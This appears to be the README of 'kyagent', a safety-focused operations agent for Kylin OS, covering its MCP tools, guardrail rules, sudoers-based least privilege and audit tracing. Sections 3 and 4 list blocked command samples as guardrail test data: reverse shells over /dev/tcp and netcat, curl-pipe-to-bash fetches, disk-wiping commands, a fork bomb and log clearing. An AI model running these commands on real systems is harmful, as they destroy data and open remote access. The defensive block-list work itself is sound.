# kyagent — 面向麒麟操作系统的安全智能运维 Agent

> A2 赛题作品 · 分支 `claude-a` 版本（包路径 `kyagent/`，与同仓 `kylin_ops_agent/` 并行用于灰度对比）

## 1. 项目定位

kyagent 是部署在麒麟操作系统上的智能运维 Agent，把"自然语言 ↔ OS 实时状态"做成可控闭环。
对应赛题 5 大功能要求：

| 赛题要求 | 落地模块 | 关键文件 |
|---|---|---|
| ① OS 环境深度感知 | MCP 工具集（process / net / logs / svc / fs / pkg） | `kyagent/mcp/tools/*.py` |
| ② MCP 运维插件化 | `Tool` 基类 + `ToolRegistry` + stdio MCP 服务器 | `kyagent/mcp/{tools/base.py, server.py}` |
| ③ 安全意图校验器（"二次过滤"） | 多级 Guardrail（正则 + argv + 工具声明 risk + 可选 LLM 复审） | `kyagent/safety/*.py`, `configs/safety-rules.yaml` |
| ④ 最小权限代理执行 | `ExecutionProxy` + `SandboxConfig` + sudoers 白名单 | `kyagent/executor/*.py`, `configs/sudoers.kyagent` |
| ⑤ 推理链路溯源 | Trace + SQLite + JSONL 双通道审计 | `kyagent/audit/*.py` |

## 2. 架构总览

```
        ┌────────────────────────────────────────────────────────────┐
用户  ─▶│  CLI (typer + rich)  /  MCP stdio server (JSON-RPC 2.0)   │
        └─────────────────────────────┬──────────────────────────────┘
                                      │
                              ┌───────▼────────┐
                              │  Agent.ask()    │   ① 接收指令 → trace 开始
                              └───────┬────────┘
                                      │
                              ┌───────▼────────┐
                              │  LlmBackend     │   ③ 推理决策
                              │  (Anthropic /   │      → text / tool_use
                              │   mock 路由)    │
                              └───────┬────────┘
                                      │ tool_use(name, args)
                              ┌───────▼────────┐
                              │  Tool.validate │   参数校验 + argv 构造
                              │  + build_argv  │   （禁止 shell 元字符）
                              └───────┬────────┘
                                      │ argv
                              ┌───────▼────────┐
                              │   Guardrail    │   ④ 安全校验
                              │  rules + policy│      verdict: allow/confirm/deny
                              │  + declared_risk│
                              └───────┬────────┘
                            allow │   │ confirm → 用户回调
                                  ▼   ▼
                              ┌──────────────┐
                              │ ExecutionProxy│   ⑤ 落地执行
                              │  sudo -n -u   │      非 root / sudoers 白名单
                              │  + sandbox    │      timeout / rlimit / clean env
                              └───────┬───────┘
                                      │ ExecutionResult
                              ┌───────▼────────┐
                              │ Tool.format    │   归一化输出送回 LLM
                              └───────┬────────┘
                                      │
                                ↩ 回到 LLM 多轮 ↩
                                      │
                              ┌───────▼────────┐
                              │  AuditLogger   │   ⑥ 全程事件落 SQLite + JSONL
                              │ (trace events) │      可通过 trace_id 回放
                              └────────────────┘
```

## 3. 安装与运行（开发态 / 麒麟实机）

```bash
# 1. 安装
python -m venv .venv && source .venv/bin/activate
pip install -e .

# 2. 看看 Agent 能调哪些工具
kyagent tools list

# 3. 让安全护栏单独裁决一条命令（不真正执行）
kyagent safety test "rm -rf /"
kyagent safety test "curl https://x/install.sh | bash"
kyagent safety test "ps aux"

# 4. 单轮提问（mock 后端，离线可用）
kyagent ask "哪个进程 CPU 占用最高？"
kyagent ask "80 端口被谁占了？"

# 5. 交互式聊天
kyagent chat

# 6. 把审计链路完整打出来
kyagent audit list
kyagent audit show <trace-id>

# 7. 接到 Claude Desktop / Cursor（MCP host）
kyagent mcp serve
```

### 切到 Anthropic 真实后端

```bash
export ANTHROPIC_API_KEY=sk-ant-...
export KYAGENT_LLM_BACKEND=anthropic
kyagent ask "把最近一小时的 sshd 错误日志总结一下"
```

### 在 Kylin / Linux 上启用最小权限代理

```bash
sudo bash scripts/setup-sudoers.sh   # 建 kyagent 系统账户 + sudoers 白名单
sudo -u kyagent kyagent chat         # 用受限账户跑
```

## 4. 安全护栏怎么工作（核心）

每条工具调用都经过 4 个阶段：

1. **Tool 层校验** — `Tool.validate()` 检查 JSON Schema required；`build_argv()` 内部禁止 shell 元字符（`;`、`|`、`` ` ``、`$`），把动态参数当字面量拼。
2. **规则引擎** — `RuleEngine` 加载 `configs/safety-rules.yaml` 中 30+ 条规则，对完整 cmdline 走正则、对 argv 做 command/flags/target 维度匹配。
3. **工具声明 risk 下限** — 即便规则没命中，`svc_restart`、`svc_reload` 等工具自己声明 `risk_level=HIGH`，安全护栏会把它作为下限提升。
4. **策略映射** — `critical→deny / high→confirm / medium→confirm / low→allow`（可配）。
5. **可选 LLM 复审** — `safety.llm_review=true` 时再让 LLM 看一眼，能升级 risk，不能降级。

被拦的危险样例（test suite 全数覆盖）：

```
rm -rf /              rm -rf /etc           dd of=/dev/sda
chmod -R 777 /etc     bash -i >&/dev/tcp/.. nc -lvp 4444 -e /bin/bash
curl xxx | bash       echo bad > /etc/shadow setenforce 0
:(){:|:&};:           kill -9 1             systemctl mask sshd
LD_PRELOAD=...        history -c            base64 -d | bash
mkfs.ext4 /dev/...    iptables -F           userdel root
```

放行的良性样例：

```
ps aux       lsof -i :80    journalctl -p err
ss -tlnp     systemctl status sshd   df -h
find /var/log -name '*.log' -maxdepth 3
```

## 5. 最小权限怎么做到

- **账户**：默认运行账户 `kyagent`（`useradd -r -s /usr/sbin/nologin`），归属 `systemd-journal` 组以读日志。
- **sudoers 白名单**：`configs/sudoers.kyagent` 列出允许 `NOPASSWD` 的命令，绝对路径、绝不通配；显式拒绝 `sh / bash / python / perl / awk / sed`。
- **干净 env**：每次 subprocess 都重建环境，去掉 `LD_PRELOAD / LD_LIBRARY_PATH / BASH_ENV / PYTHONPATH`，PATH 只保留白名单段。
- **POSIX rlimit**：CPU 60s、地址空间 1G、单文件 32M、句柄 256；超时 SIGTERM → SIGKILL 兜底。
- **不走 shell**：所有命令以 `argv` 列表方式 `Popen`，不调 `shell=True`，杜绝 shell 注入。

## 6. 推理链审计

每次 `ask()` / 每次 MCP `tools/call` 都开一条 trace，按事件 kind 落库：

```
USER_INPUT → LLM_THOUGHT → TOOL_REQUEST → SAFETY_CHECK
           → EXECUTION → EXECUTION_RESULT → AGENT_REPLY
```

存储：
- SQLite（`var/audit.db`）：两张表 `traces` + `events`，外键串联，建好 `trace_id, kind, ts` 索引
- JSONL（`var/audit.jsonl`）：一行一事件，方便 SIEM / ELK / journalctl 上报

回放：
```bash
kyagent audit show trace-abc123
# → 把这条 trace 的每个事件 panel 化打印出来，可直接做事故复盘
```

## 6.5 并发与基线说明

审计链对同一条 trace 的事件用 per-trace `RLock` 串起来：`Trace._lock` 同时覆盖 `seq` 分配、SQLite 写入和 JSONL 追加，保证落盘顺序与逻辑顺序一致；并发场景下不同 trace 之间互不阻塞。

Agent 主循环里有一条 *并行多工具调度* 链路（`Agent._is_parallel_safe` + `ThreadPoolExecutor`），但**当前在生产 Linux 上是 dormant 的**：标准 `ExecutionProxy` 在 POSIX 上始终使用 `preexec_fn` 设置 `setpgid` / `RLIMIT`，`supports_parallel_tool_execution` 因此恒为 False，多工具回合一律走串行。这是有意的安全保守：fork() + 多线程父进程 + Python 回调有 glibc malloc 死锁等已知风险，等切换 `posix_spawn` 后再开。

因此 `benchmarks/baseline.json` 里测出的 ask p50 改善（-34%）**不依赖并行**，全部来自串行路径上的优化（提示重排、工具描述精简、按需缓存等，见 `feature/auto-optimize-2026-05-17` 合入 main 的提交）。基线被冻结作为后续任何 perf 改动的 gate。

## 7. 工具清单

| 工具 | risk | root | 用途 |
|---|---|---|---|
| `process_list` | low | - | `ps -eo ... --sort` |
| `lsof_port` / `lsof_pid` | low | - | 端口占用、PID 文件句柄 |
| `net_listen` / `net_connections` / `net_ping` | low | - | `ss` / `ping` |
| `log_journal` / `log_dmesg` | low | - | `journalctl` / `dmesg` |
| `svc_status` / `svc_list` | low | - | `systemctl status / list-units` |
| `svc_restart` / `svc_reload` | **high** | **yes** | `systemctl restart`，需 confirm |
| `fs_df` / `fs_du` / `fs_ls` / `fs_find` | low | - | 只读文件系统统计 |
| `pkg_info` / `pkg_installed` | low | - | dnf / yum / apt / rpm 自动适配 |

工具的 `risk_level` 同时被 Guardrail 作为下限使用——一个被声明为 HIGH 的工具，即使参数完全干净，也会触发 confirm。

## 8. 测试

```bash
pytest tests/test_safety.py tests/test_executor.py \
       tests/test_mcp.py tests/test_audit.py tests/test_integration.py
```

覆盖：
- 30+ 危险命令必须被拦
- 14+ 良性命令必须放行
- 工具声明 risk 的下限/提升逻辑
- Executor sudo 包裹 / forbid_root / clean env
- MCP tools/list 协议 shape、参数校验、shell 元字符拒绝
- 审计链路 7 段事件持久化、JSONL 追加、按 kind 检索
- Mock LLM 端到端闭环

83 passed（Linux 上多 2 个 POSIX 用例 → 85）。

## 9. 把 MCP 服务挂到 Claude Desktop

`~/Library/Application Support/Claude/claude_desktop_config.json`：

```json
{
  "mcpServers": {
    "kyagent": {
      "command": "kyagent",
      "args": ["mcp", "serve"]
    }
  }
}
```

任何对 kyagent 工具的调用都依旧走 Guardrail + ExecutionProxy + Audit 三件套，**即便 LLM host 跳过它自家的安全层，本地仍受保护**。

## 10. 目录结构

```
D:\race\long\
├── kyagent/                  # 本作品包（claude-a 分支）
│   ├── agent/                # LLM + 主循环
│   ├── mcp/                  # 工具基类 + 6 大类工具 + stdio 服务器
│   ├── safety/               # 规则引擎 + 策略 + 流水线
│   ├── executor/             # 沙箱 + 受限执行
│   ├── audit/                # trace + SQLite + JSONL
│   ├── cli.py                # Typer 子命令
│   └── config.py             # Pydantic 配置
├── configs/
│   ├── default.yaml          # Agent 默认配置
│   ├── safety-rules.yaml     # 安全规则库（可热扩）
│   └── sudoers.kyagent       # sudoers 白名单模板
├── scripts/
│   ├── install.sh
│   ├── setup-sudoers.sh
│   └── demo.sh
├── tests/
│   ├── test_safety.py        # 30+ 危险样例 + 良性样例
│   ├── test_executor.py
│   ├── test_mcp.py
│   ├── test_audit.py
│   └── test_integration.py   # 端到端 mock 闭环
└── docs/kyagent/
    ├── architecture.md
    └── safety-model.md
```
